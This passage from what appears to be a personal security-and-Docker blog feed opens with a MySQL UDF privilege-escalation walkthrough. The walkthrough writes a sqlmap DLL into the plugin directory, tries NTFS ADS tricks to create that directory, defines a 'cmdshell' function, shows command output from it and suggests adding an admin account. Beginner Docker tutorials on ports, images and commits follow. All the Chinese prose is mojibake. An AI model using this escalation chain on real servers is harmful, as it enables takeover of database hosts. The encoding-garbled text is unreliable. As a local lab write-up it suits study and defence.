id="udfææƒ">udfææƒ</h3><p>é¦–å…ˆudfçš„ææƒä¼šæ¶‰åŠåˆ°mysqlçš„ç‰ˆæœ¬é—®é¢˜,5.1ä»¥ä¸Šå’Œ5.1ä¸€ä¸‹æ˜¯ä¸ä¸€æ ·çš„ è€Œä¸”ææƒçš„ç³»ç»Ÿä¸ä¸€æ ·æ“ä½œä¹Ÿæ˜¯ä¸ä¸€æ ·çš„.... ç„¶åæ¶‰åŠåˆ°çš„dllæˆ–è€…soæ–‡ä»¶åœ¨sqlmapçš„udfæ–‡ä»¶å¤¹é‡Œé¢éƒ½æœ‰ ç›´æ¥å¼€å§‹å§,é¦–å…ˆçœ‹ä¸€ä¸‹ä½ çš„pluginè·¯å¾„ <img src="/images/2018/02/sql_5.png" alt="blacsheep" /> æœ¬æœºæ˜¯windows64ä½,æ‰€ä»¥ç”¨çš„win/64/xxxx.dll æŠŠè¿™ä¸ªæ–‡ä»¶å†™å…¥åˆ°pluginç›®å½•ä¸‹,ä½†æ˜¯ç”±äºsqlè¯­å¥æ— æ³•åˆ›å»ºç›®å½•...å¾ˆå°´å°¬,ç„¶åç½‘ä¸Šæœ‰å¤§ç¥æµä¼ çš„æ–¹æ³•:åˆ©ç”¨ntfs adsæµåˆ›å»ºç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;xxx&#x27; into outfile &#x27;D:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION&#x27;;</span><br><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;D:\\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#x27;;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¾ˆé—æ†¾...æˆ‘å°è¯•äº†å‡ æ¬¡å‘ç°éƒ½æ˜¯å¤±è´¥çš„.... <img src="/images/2018/02/sql_6.png" alt="blacsheep" /> æœ‰äººè¯´æ˜¯mysqlæ›´æ–°ä¹‹åå¯¼è‡´çš„...å…·ä½“åŸå› æˆ‘ä¹Ÿä¸æ¸…æ¥š... æ€è€ƒäº†ä¸€ä¸‹è§‰å¾—,å¯ä»¥å†™çš„è¯é‚£å°±å†™ä¸ªwebshellè¿›å»,æœ‰æƒé™çš„è¯ç›´æ¥åˆ›å»ºä¸€ä¸ªpluginæ–‡ä»¶å¤¹å°±okäº†,å…·ä½“çš„å°±ä¸çœ‹äº†...æœ¬åœ°å®éªŒæˆ‘å°±ç›´æ¥å³é”®åˆ›å»ºäº†(èœé¸¡æ‚è„¸ing) åˆ›å»ºä¹‹åå†™ä¸ªsqlå¯¼å…¥dll</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;D:\\python2\\Lib\\site-packages\\sqlmap\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll_&quot;) into outfile &quot;D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure><p>æœ€è›‹ç–¼çš„éƒ¨åˆ†æ¥äº†... åˆ›å»ºè¿™é‡Œç–¯ç‹‚å‡ºé—®é¢˜... åæ¥ç½‘ä¸Šæ‰¾äº†ä¸ªè„šæœ¬æ‰çŸ¥é“æ˜¯dllæ–‡ä»¶çš„é—®é¢˜... è„šæœ¬æ”¾ä¸€ä¸‹ <a href="/images/2018/07/udf_Ti_Quan.zip">udfææƒ</a> å¼„å¥½äº†dllæ–‡ä»¶åé¢å°±ç®€å•äº†... æ•°æ®åº“è‡ªé€‰..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use udf;</span><br><span class="line">create function cmdshell returns string soname &#x27;moonudf.dll&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/02/ææƒ.png" alt="blacsheep" /> ç„¶åå°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†... è¿™é‡Œæˆ‘æŠŠå‡å·åˆ æ‰äº†....</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select cmdshell(&#x27;dir&#x27;);</span><br><span class="line">++</span><br><span class="line"> cmdshell(&#x27;dir&#x27;) </span><br><span class="line">++</span><br><span class="line">  é©±åŠ¨å™¨ D ä¸­çš„å·æ˜¯ è½¯ä»¶</span><br><span class="line"> å·çš„åºåˆ—å·æ˜¯ A622-E827</span><br><span class="line"></span><br><span class="line"> D:\phpStudy\MySQL\data çš„ç›®å½•</span><br><span class="line"></span><br><span class="line">2018/02/09  16:06    &lt;DIR&gt;          .</span><br><span class="line">2018/02/09  16:06    &lt;DIR&gt;          ..</span><br><span class="line">2017/12/26  02:08    &lt;DIR&gt;          challenges</span><br><span class="line">2018/02/02  17:49               669 DESKTOP-76O3SAJ.err</span><br><span class="line">2018/02/09  15:15                 5 DESKTOP-76O3SAJ.pid</span><br><span class="line">2017/11/27  01:06    &lt;DIR&gt;          flappy</span><br><span class="line">2017/12/02  14:13    &lt;DIR&gt;          friends</span><br><span class="line">2018/02/02  17:30        18,874,368 ibdata1</span><br><span class="line">2018/02/09  15:15        25,165,824 ib_logfile0</span><br><span class="line">2017/07/12  21:48        25,165,824 ib_logfile1</span><br><span class="line">2017/11/29  03:42    &lt;DIR&gt;          mctf_empty</span><br><span class="line">2017/07/12  21:48    &lt;DIR&gt;          mysql</span><br><span class="line">2017/11/25  17:46    &lt;DIR&gt;          my_db</span><br><span class="line">2017/07/12  21:48    &lt;DIR&gt;          performance_schema</span><br><span class="line">2017/12/26  02:08    &lt;DIR&gt;          security</span><br><span class="line">2018/02/09  16:34    &lt;DIR&gt;          udf</span><br><span class="line">2017/11/08  18:41    &lt;DIR&gt;          ultrax</span><br><span class="line">               5 ä¸ªæ–‡ä»¶     69,206,690 å­—èŠ‚</span><br><span class="line">              12 ä¸ªç›®å½• 192,709,541,888 å¯ç”¨å­—èŠ‚</span><br><span class="line"></span><br><span class="line">--------------------------------------------å®Œæˆ!</span><br><span class="line">                                                   </span><br><span class="line">++</span><br><span class="line">1 row in set (4.84 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„åˆ›å»ºç®¡ç†å‘˜ä»€ä¹ˆçš„è‡ªå·±åˆ›å»ºå°±å¥½äº†~ å¯¹äº†,æœ€ååˆ«å¿˜äº†drop function cmdshell;</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dockeræ–°æ‰‹å…¥é—¨(4)ä¹‹å®¹å™¨è¿æ¥</title>
      <link href="/2018/01/29/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A84%E4%B9%8B%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/"/>
      <url>/2018/01/29/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A84%E4%B9%8B%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>å‰é¢å†™è¿‡æ€ä¹ˆé€šè¿‡åå°è¿è¡Œä¸€ä¸ªdockerçš„webåº”ç”¨å¹¶ä¸”æœ¬æœºé€šè¿‡ç‰¹å®šç«¯å£è®¿é—®,è¿™ä¸€éƒ¨åˆ†è®²çš„å¤§æ¦‚å°±æ˜¯è¿™ä¸€å—çš„å†…å®¹äº†</p><h3 id="ç½‘ç»œç«¯å£æ˜ å°„">ç½‘ç»œç«¯å£æ˜ å°„</h3><p>åˆ›å»ºä¸€ä¸ªpythonåº”ç”¨çš„å®¹å™¨,è¿˜æ˜¯å’Œä»¥å‰ä¸€æ ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -P training/webapp python app.py</span><br><span class="line">0a4a54a161ad6226681a03d708a40003cdac29217c8d181a5d7c868dcfcc4a87</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                     NAMES</span><br><span class="line">0a4a54a161ad        training/webapp     &quot;python app.py&quot;     6 seconds ago       Up 4 seconds        0.0.0.0:32768-&gt;5000/tcp   objective_curie</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>-PæŒ‡çš„æ˜¯ä½¿ç”¨dockeræŒ‡å®šçš„ç«¯å£ å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ç«¯å£,ä½¿ç”¨-p ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -p 5000:5000 training/webapp python app.py</span><br><span class="line">e25b18467f580af41abd52eae2710f999b7f3b901d9be932af09c96aede5a706</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">e25b18467f58        training/webapp     &quot;python app.py&quot;     4 seconds ago       Up 3 seconds        0.0.0.0:5000-&gt;5000/tcp   suspicious_hermann</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨udpçš„è¯,å¯ä»¥åœ¨ç«¯å£åé¢åŠ ä¸Š/udp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -p 5000:5000/udp training/webapp python app.py</span><br><span class="line">a2c1428b1ebb5559396ba4ee6c859d881a3f5c1da3b77d00f01b0ad1ed43cee9</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                              NAMES</span><br><span class="line">a2c1428b1ebb        training/webapp     &quot;python app.py&quot;     6 seconds ago       Up 4 seconds        5000/tcp, 0.0.0.0:5000-&gt;5000/udp   tender_shaw</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>docker portå¯ä»¥å¸®æˆ‘ä»¬æŸ¥çœ‹ç«¯å£ç»‘å®šçš„æƒ…å†µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker port a2c1428b1ebb</span><br><span class="line">5000/udp -&gt; 0.0.0.0:5000</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><h3 id="dockerå®¹å™¨è¿æ¥">dockerå®¹å™¨è¿æ¥</h3><p>ç«¯å£æ˜ å°„ä¸æ˜¯å”¯ä¸€çš„è¿æ¥çš„æ–¹æ³•...</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dockeræœ‰ä¸€ä¸ªè¿æ¥ç³»ç»Ÿå…è®¸å°†å¤šä¸ªå®¹å™¨è¿æ¥åœ¨ä¸€èµ·ï¼Œå…±äº«è¿æ¥ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">dockerè¿æ¥ä¼šåˆ›å»ºä¸€ä¸ªçˆ¶å­å…³ç³»ï¼Œå…¶ä¸­çˆ¶å®¹å™¨å¯ä»¥çœ‹åˆ°å­å®¹å™¨çš„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜ä¸å¤§çœ‹å¾—æ‡‚...æ…¢æ…¢å­¦å§...</p><h3 id="å®¹å™¨å‘½å">å®¹å™¨å‘½å</h3><p>é€šè¿‡--nameæ¥æ ‡è¯†å®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -P --name blacsheep training/webapp python app.py</span><br><span class="line">17799882b9dd0d255b1ca62f5c9b0a45e0d35d277427271e1d6a17b762246e94</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                     NAMES</span><br><span class="line">17799882b9dd        training/webapp     &quot;python app.py&quot;     6 seconds ago       Up 6 seconds        0.0.0.0:32769-&gt;5000/tcp   blacsheep</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep#</span><br></pre></td></tr></table></figure><p>okokè¦å‡ºé—¨äº†....å›æ¥ç»§ç»­å†™...</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dockeræ–°æ‰‹å…¥é—¨(3)ä¹‹é•œåƒä½¿ç”¨</title>
      <link href="/2018/01/28/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A83%E4%B9%8B%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/01/28/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A83%E4%B9%8B%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>è¿è¡Œå®¹å™¨çš„æ—¶å€™å¦‚æœé•œåƒæœ¬åœ°ä¸å­˜åœ¨,dockerå°±ä¼šä»dockeré•œåƒä»“åº“é‡Œé¢å»ä¸‹è½½,é»˜è®¤docker hubå…¬å…±é•œåƒæº è¿™ä¸€ç¯‡ä¸»è¦æ˜¯æ€ä¹ˆç®¡ç†ä½¿ç”¨æœ¬åœ°é•œåƒä»¥åŠåˆ›å»ºé•œåƒ</p><h3 id="åˆ—å‡ºé•œåƒåˆ—è¡¨">åˆ—å‡ºé•œåƒåˆ—è¡¨</h3><p>å‘½ä»¤:docker images</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago        107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago         349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>å…¶ä¸­ repository:é•œåƒçš„ä»“åº“æº tag:é•œåƒçš„æ ‡ç­¾ image id:é•œåƒid created:åˆ›å»ºæ—¶é—´ size:å¤§å° ä¸€ä¸ªä»“åº“æºå¯ä»¥æœ‰å¤šä¸ªtag,æ¯”å¦‚ä¸€ä¸ªubuntuçš„ä»“åº“æºé‡Œé¢å¯ä»¥æœ‰14.04,15.10ç­‰ç­‰ç‰ˆæœ¬,æˆ‘ä»¬å¯ä»¥ç”¨repository:tagæ¥å®šä¹‰ä¸åŒçš„é•œåƒ,æ¯”å¦‚æˆ‘ä»¬è¦ç”¨16.10çš„ubuntuæ¥è¿è¡Œå®¹å™¨çš„æ—¶å€™,å°±æ˜¯ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -t -i ubuntu:16.10 /bin/bash </span><br><span class="line">root@68cc92ce5dee:/# </span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å»æŒ‡å®šé•œåƒçš„æ ‡ç­¾çš„è¯,æ¯”å¦‚åªç”¨ubuntu,dockerå°±ä¼šé»˜è®¤ä½¿ç”¨ubuntu:latestçš„é•œåƒ</p><h3 id="è·å–é•œåƒ">è·å–é•œåƒ</h3><p>ä½¿ç”¨docker pull,åŒæ—¶è¯´æ˜ä¸å¸¦æ ‡ç­¾çš„è¯ä½¿ç”¨çš„æ˜¯latestçš„æ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker pull ubuntu</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/ubuntu</span><br><span class="line">1be7f2b886e8: Pull complete </span><br><span class="line">6fbc4a21b806: Pull complete </span><br><span class="line">c71a6f8e1378: Pull complete </span><br><span class="line">4be3072e5a37: Pull complete </span><br><span class="line">06c6d2f59700: Pull complete </span><br><span class="line">Digest: sha256:e46251ecd3548065ca203df31bdcf25e53b530b9b39bd3a86ac8147b347bb7ac</span><br><span class="line">Status: Downloaded newer image for ubuntu:latest</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>ä¸‹è½½å®Œæˆä¹‹ådocker imagesæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              0458a4468cbc        2 days ago          112MB</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago        107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago         349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><h3 id="æŸ¥æ‰¾é•œåƒ">æŸ¥æ‰¾é•œåƒ</h3><p>å¯ä»¥ä»docker hubçš„ç½‘ç«™æ¥æœç´¢é•œåƒ,ç½‘å€ä¸ºhttps://hub.docker.com/ å¦‚æœæƒ³ç”¨å‘½ä»¤è¡Œ,å¯ä»¥ç”¨docker search xxx,æ¯”å¦‚æˆ‘ä»¬æƒ³æ‰¾ä¸€ä¸ªhttpdçš„é•œåƒä½œä¸ºwebæœåŠ¡,å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker search httpd</span><br><span class="line">NAME                                DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">httpd                               The Apache HTTP Server Project                  1470                [OK]                </span><br><span class="line">hypriot/rpi-busybox-httpd           Raspberry Pi compatible Docker Image with a â€¦   40                                      </span><br><span class="line">centos/httpd                                                                        15                                      [OK]</span><br><span class="line">centos/httpd-24-centos7             Platform for running Apache httpd 2.4 or buiâ€¦   8                                       </span><br><span class="line">armhf/httpd                         The Apache HTTP Server Project                  8                                       </span><br><span class="line">macadmins/netboot-httpd             use in combination with bruienne/bsdpy          4                                       [OK]</span><br><span class="line">lolhens/httpd                       Apache httpd 2 Server                           2                                       [OK]</span><br><span class="line">salim1983hoop/httpd24               Dockerfile running apache config                2                                       [OK]</span><br><span class="line">fboaventura/dckr-httpd              Small footprint http server to use with otheâ€¦   1                                       [OK]</span><br><span class="line">rgielen/httpd-image-simple          Docker image for simple Apache httpd based oâ€¦   1                                       [OK]</span><br><span class="line">lead4good/httpd-fpm                 httpd server which connects via fcgi proxy hâ€¦   1                                       [OK]</span><br><span class="line">epflidevelop/os-wp-httpd            WP httpd                                        1                                       [OK]</span><br><span class="line">rgielen/httpd-image-php5            Docker image for Apache httpd with PHP 5 basâ€¦   1                                       [OK]</span><br><span class="line">publici/httpd                       httpd:latest                                    0                                       [OK]</span><br><span class="line">tplatform/aws-linux-httpd24-php70   aws-linux-httpd24-php70                         0                                       [OK]</span><br><span class="line">dockerpinata/httpd                                                                  0                                       </span><br><span class="line">trollin/httpd                                                                       0                                       </span><br><span class="line">manasip/httpd                                                                       0                                       </span><br><span class="line">manageiq/httpd                      Container with httpd, built on CentOS for Maâ€¦   0                                       [OK]</span><br><span class="line">jbpt/httpd                                                                          0                                       [OK]</span><br><span class="line">fintaffy/fintaffy-httpd                                                             0                                       </span><br><span class="line">efrecon/httpd                       A micro-sized httpd. Start serving files in â€¦   0                                       [OK]</span><br><span class="line">ppc64le/httpd                       The Apache HTTP Server Project                  0                                       </span><br><span class="line">sbutler/pie-httpd                   PIE httpd server                                0                                       </span><br><span class="line">camptocamp/os-wp-httpd              Wordpress httpd                                 0                                       [OK]</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>name:è¡¨ç¤ºé•œåƒä»“åº“æºçš„åç§° description:é•œåƒæè¿° official:æ˜¯å¦æ˜¯dockerå®˜æ–¹å‘å¸ƒçš„</p><h3 id="æ‰˜å–é•œåƒ">æ‰˜å–é•œåƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker pull httpd</span><br><span class="line"></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/httpd</span><br><span class="line">f49cf87b52c1: Pull complete </span><br><span class="line">02ca099fb6cd: Pull complete </span><br><span class="line">de7acb18da57: Pull complete </span><br><span class="line">770c8edb393d: Pull complete </span><br><span class="line">0e252730aeae: Pull complete </span><br><span class="line">6288e83d58fa: Pull complete </span><br><span class="line">a91ad03b2178: Pull complete </span><br><span class="line">Digest: sha256:6261d80fe154a7d7f1cbb0ca90eb344fafb4511afd06ebfc2d41915367ce25ad</span><br><span class="line">Status: Downloaded newer image for httpd:latest</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>ä¹‹ådocker run httpdå°±å¯ä»¥äº†</p><h3 id="åˆ›å»ºé•œåƒé‡ç‚¹">åˆ›å»ºé•œåƒ(é‡ç‚¹)</h3><p>å¦‚æœæˆ‘ä»¬ä»dockeré•œåƒä»“åº“é‡Œé¢ä¸‹è½½çš„é•œåƒä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚çš„è¯,æœ‰ä¸¤ç§æ–¹å¼å¯ä»¥å¯¹é•œåƒè¿›è¡Œæ›´æ”¹ - 1.ä»å·²ç»åˆ›å»ºçš„å®¹å™¨ä¸­æ›´æ–°é•œåƒ,å¹¶ä¸”æäº¤è¿™ä¸ªé•œåƒ - 2.ä½¿ç”¨docker fileæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒ</p><h5 id="æ›´æ–°é•œåƒ">æ›´æ–°é•œåƒ</h5><p>æ›´æ–°ä¹‹å‰å…ˆç”¨é•œåƒåˆ›å»ºä¸€ä¸ªå®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -t -i ubuntu:16.10 /bin/bashroot@000b42c94ddd:/#</span><br></pre></td></tr></table></figure><p>å®¹å™¨å†…ä½¿ç”¨apt-get updateæ›´æ–°ä¸€ä¸‹ å®Œæˆä¹‹åexité€€å‡º è¿™ä¸ªå®¹å™¨æ˜¯æŒ‰æˆ‘ä»¬çš„éœ€æ±‚ä¿®æ”¹çš„å®¹å™¨,å¯ä»¥ä½¿ç”¨docker commitæ¥æäº¤å®¹å™¨å‰¯æœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker commit -m=&quot;update ubuntu&quot; -a=&quot;blacsheep&quot; 000b42c94ddd blacsheep/ubuntu:v1</span><br><span class="line">sha256:3846343d3b39a77b3dbadb32cdef5a3669560bbb96d52d639f24cc06f8d2655e</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>-m:æäº¤çš„æè¿° -a:é•œåƒä½œè€… 000b42c94ddd:å®¹å™¨id blacsheep/ubuntu:v1:é•œåƒå:æ ‡ç­¾ ç„¶ådocker imagesæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE</span><br><span class="line">blacsheep/ubuntu    v1                  3846343d3b39        About a minute ago   107MB</span><br><span class="line">httpd               latest              2e202f453940        2 days ago           179MB</span><br><span class="line">ubuntu              latest              0458a4468cbc        2 days ago           112MB</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago         107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago          349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ä½¿ç”¨æ–°çš„é•œåƒæ¥åˆ›å»ºå®¹å™¨äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -t -i blacsheep/ubuntu:v1 /bin/bash</span><br><span class="line">root@02b45e36003d:/#</span><br></pre></td></tr></table></figure><h5 id="dockerfileåˆ›å»ºé•œåƒ">dockerfileåˆ›å»ºé•œåƒ</h5><p>ä½¿ç”¨docker buildå¯ä»¥ä»é›¶å¼€å§‹åˆ›å»ºä¸€ä¸ªé•œåƒã€‚ä½†æ˜¯æˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªDockerfileæ¥å‘Šè¯‰dockeræ€ä¹ˆæ¥åˆ›å»ºæˆ‘ä»¬çš„é•œåƒ dockerfileè‡ªå·±å†™ å†™å®Œäº†å¤§æ¦‚å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# cat Dockerfile</span><br><span class="line">From ubuntu:16.04</span><br><span class="line">RUN /bin/echo &#x27;root:123456&#x27; chpasswd</span><br><span class="line">RUN useradd blacsheep</span><br><span class="line">RUN /bin/echo &#x27;blacsheep:123456&#x27; chpasswd</span><br><span class="line">RUN /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/local</span><br><span class="line">EXPOSE 22</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD /usr/sbin/sshd 